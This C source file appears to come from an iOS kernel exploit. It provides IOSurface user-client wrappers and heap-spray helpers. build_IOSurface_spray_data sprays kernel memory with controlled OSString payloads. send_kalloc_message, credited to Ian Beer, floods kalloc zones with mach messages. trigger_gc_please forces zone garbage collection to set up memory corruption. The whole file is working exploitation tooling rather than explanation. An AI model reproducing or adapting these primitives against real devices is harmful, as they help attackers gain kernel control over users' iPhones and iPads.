#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

#include "helper.h"
#include "iokit.h"
#include "iosurface.h"

// The ID of the IOSurface we're using.
uint32_t IOSurface_id;

// Is the IOSurface subsystem initialized?
bool IOSurface_initialized;

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClient;

// Kernel Page Size.
mach_vm_size_t pagesize;


bool
IOSurface_init() {
    if (IOSurface_initialized) {
		return true;
	}

    IOSurfaceRoot = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));

    if (IOSurfaceRoot == MACH_PORT_NULL) {
        ERROR("Couldn't find IOSurfaceRoot\n");
        return false;
    }

    kern_return_t kr = IOServiceOpen(
        IOSurfaceRoot,
        mach_task_self(),
        0,
        &IOSurfaceRootUserClient);
    if(kr != KERN_SUCCESS) {
        ERROR("Couldn't open IOSurfaceRootUserClient, kr=0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }

    vm_size_t pgsz = 0;
    kr = _host_page_size(mach_host_self(), &pgsz);
    pagesize = pgsz;
    INFO("page size: 0x%llx, kr=%s\n", pagesize, mach_error_string(kr));
    if(kr != KERN_SUCCESS) {
        ERROR("Failed to get kernel page size, kr=0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);
    bzero(&lock_result, lock_result_size);

    kr = IOConnectCallStructMethod(
        IOSurfaceRootUserClient,
        0,   //IOSurfaceRootUserClient::s_create_surface
        dict_create, sizeof(dict_create),
        &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS)
    {
        ERROR("Failed to call create_surface, kr=0x%x (%s)\n", kr, mach_error_string(kr));
        return false;
    }

    IOSurface_id = lock_result.surface_id;
    IOSurface_initialized = true;
    INFO("IOSurface_init success, IOSurface_id=0x%x\n", IOSurface_id);
    return true;
}

/*
 * IOSurface_set_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::set_value().
 */
bool
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallStructMethod(
			IOSurfaceRootUserClient,
			9, // set_value
			args, args_size,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
		return false;
	}
	return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::get_value().
 */
bool
IOSurface_get_value(const struct IOSurfaceValueArgs *in, size_t in_size,
        struct IOSurfaceValueArgs *out, size_t *out_size) {
    kern_return_t kr = IOConnectCallStructMethod(
            IOSurfaceRootUserClient,
            10, // get_value
            in, in_size,
            out, out_size);
    if (kr != KERN_SUCCESS) {
        ERROR("failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 * 	A wrapper around IOSurfaceRootUserClient::remove_value().
 */
bool
IOSurface_remove_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
	struct IOSurfaceValueResultArgs result;
	size_t result_size = sizeof(result);
	kern_return_t kr = IOConnectCallMethod(
			IOSurfaceRootUserClient,
			11, // remove_value
			NULL, 0,
			args, args_size,
			NULL, NULL,
			&result, &result_size);
	if (kr != KERN_SUCCESS) {
		ERROR("failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
		return false;
	}
	return true;
}

void
IOSurface_deinit() {
	IOSurface_initialized = false;
	IOSurface_id = 0;
	IOServiceClose(IOSurfaceRootUserClient);
	IOObjectRelease(IOSurfaceRoot);
}


int build_IOSurface_spray_data(void *data, size_t size, int spray_qty, uint32_t *spray_data, int spray_size) {
    /* set up our IOSurface data for spraying */
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
   /*
        +-> Surface
          +-> Array
            +-> Dictionary
              +-> OSString 
              +-> OSString
              +-> OSString 
                etc (spray_qty times)...
   */

    *(spray_cur++) = IOSurface_id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    for (int i = 0; i < spray_qty; i++)
    {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize; 
             ptr + size <= end; 
             ptr += size)
        {
            bcopy((const void *)data, (void *)ptr, size);
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }

    return 0;
}

uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}







struct simple_msg
{
    mach_msg_header_t hdr;
    char buf[0];
};

/* credits to ian beer */
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size) 
{
    // allocate a port to send the messages to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to increase queue limit\n");
        exit(EXIT_FAILURE);
    }

    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);

    for (int i = 0; i < 256; i++) 
    {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
 
        if (err != KERN_SUCCESS) 
        {
            printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    }

    return q;
}
 
uint32_t message_size_for_kalloc_size(uint32_t size)
{
    return ((size * 3) / 4) - 0x74;
}

void trigger_gc_please()
{
    // size = 100 * 16,384 * 256 = 419,430,400 = ~420mb (max)

    const int gc_ports_cnt = 100;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = malloc(body_size); 
    memset(body, 0x41, body_size);
    
    for (int i = 0; i < gc_ports_cnt; i++)
    {
        uint64_t t0, t1;

        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message(body, body_size);
        t1 = mach_absolute_time();

        /* 
            this won't necessarily get triggered on newer/faster devices (ie. >=A9)
            this is mainly designed for older devices (in my case, A7) where spraying
            such a large amount of data is a painful process 
            the idea here is to look for a longer spray which signals that GC may have
            taken place
        */
        if (t1 - t0 > 1000000) 
        {
            INFO("got gc at %d -- breaking, t1-t0: %llu\n", i, t1 - t0);
            gc_ports_max = i;
            break;
        }
    }

    for (int i = 0; i < gc_ports_max; i++)
    {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }

    sched_yield();
    sleep(1);
}